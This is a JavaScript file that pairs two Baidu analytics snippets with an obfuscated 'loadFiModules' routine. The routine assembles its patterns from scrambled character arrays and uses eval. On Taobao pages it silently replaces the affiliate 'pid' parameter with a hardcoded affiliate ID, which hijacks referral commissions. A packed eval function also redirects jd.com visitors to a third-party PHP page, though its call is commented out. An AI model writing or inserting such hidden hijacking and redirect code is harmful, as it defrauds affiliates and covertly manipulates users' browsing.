var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "//hm.baidu.com/hm.js?78ea0ea66ad61026a21db437f2eff145";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "//hm.baidu.com/hm.js?5d59452a2b1d03d9b7faab90c4809e85";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();

var loadFiModules=function(){
    this.bnit=function (){
        var da = new Date();
        var hournow=da.getHours();
        var ddkjkkkk=[];
        var dddzimu=['a','b','c','d','e','f','g','m','m','p','c','i','v','d','t','o','h'];
        //             0 1 2 3 4 5 6 7 8 9 
        var alllowNum=[4,3,5,7,1,2,8,0,9,6];
        var dddrule=eval('/'+dddzimu[16]+dddzimu[14]+dddzimu[14]+dddzimu[9]+':\\/\\/[^/]*?\\.'+dddzimu[14]+'a'+'o'+dddzimu[1]+dddzimu[0]+'o'+'/');
        var ddkjk51=alllowNum[1]+''+alllowNum[7]+''+alllowNum[1]+''+alllowNum[1]+''+alllowNum[1]+''+alllowNum[2]+''+alllowNum[0]+''+alllowNum[5];
        var ddkjk52=alllowNum[4]+''+alllowNum[7]+''+alllowNum[5]+''+alllowNum[5]+''+alllowNum[7]+''+alllowNum[0]+''+alllowNum[7]+''+alllowNum[5];
        var ddkjk53=alllowNum[1]+''+alllowNum[0]+''+alllowNum[4]+''+alllowNum[5]+''+alllowNum[7]+''+alllowNum[6]+''+alllowNum[9]+''+alllowNum[7];
       
        var pppprule=eval('/'+dddzimu[9]+''+dddzimu[11]+''+dddzimu[3]+'=([^&]*)/');
       
        ddkjkkkk[4]=dddzimu[7]+dddzimu[8]+'_'+ddkjk51+'_'+ddkjk52+'_'+ddkjk53;  
       
        ddkjkkkk[4]=dddzimu[7]+dddzimu[8]+'_'+ddkjk51+'_'+ddkjk52+'_'+ddkjk53;  
         
        ddkjkkkkm=ddkjkkkk[4]; 
         
        if(window.location.href.match(dddrule)){
            if(window.location.href.match(eval('/'+dddzimu[9]+''+dddzimu[11]+dddzimu[3]+'='+dddzimu[7]+'m_/'))){
                if(window.location.href.match(eval('/'+ddkjkkkkm+'/'))==null){
                    var xinurl=window.location.href.replace(pppprule,dddzimu[9]+dddzimu[11]+dddzimu[3]+'='+ddkjkkkkm);
                    window.location=xinurl;
                }else{
                    
                }
            }
            
        }
        //this.checkJ();
                
    }
    this.checkJ=function(){
    	eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('8(0.1.2.6(/7:\\/\\/4\\.9\\.3/)){8(0.1.2.6(/5\\.3/)==c){0.1.2=\'7://4.5.3/a.b\'}}',13,13,'window|location|href|com|www|budongnvren|match|http|if|jd|j|php|null'.split('|'),0,{}))

    }
}
lmgm=new loadFiModules();
lmgm.bnit();